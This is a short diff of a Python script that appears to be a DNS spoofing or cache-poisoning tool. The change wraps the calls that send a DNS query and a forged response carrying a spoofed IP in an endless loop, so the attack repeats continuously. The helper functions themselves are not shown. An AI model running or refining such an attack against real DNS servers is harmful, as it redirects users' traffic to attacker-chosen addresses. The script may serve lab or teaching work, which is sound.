@@ -161,8 +161,9 @@ def main():
     # server_ip, query_domain, spoofed_ip = query_for_config()
     server_ip, query_domain, spoofed_ip = manual_config()
 
-    send_dns_query(server_ip, query_domain)
-    send_spoofed_response(server_ip, query_domain, spoofed_ip)
+    while True:
+        send_dns_query(server_ip, query_domain)
+        send_spoofed_response(server_ip, query_domain, spoofed_ip)
 
 
 if __name__ == "__main__":
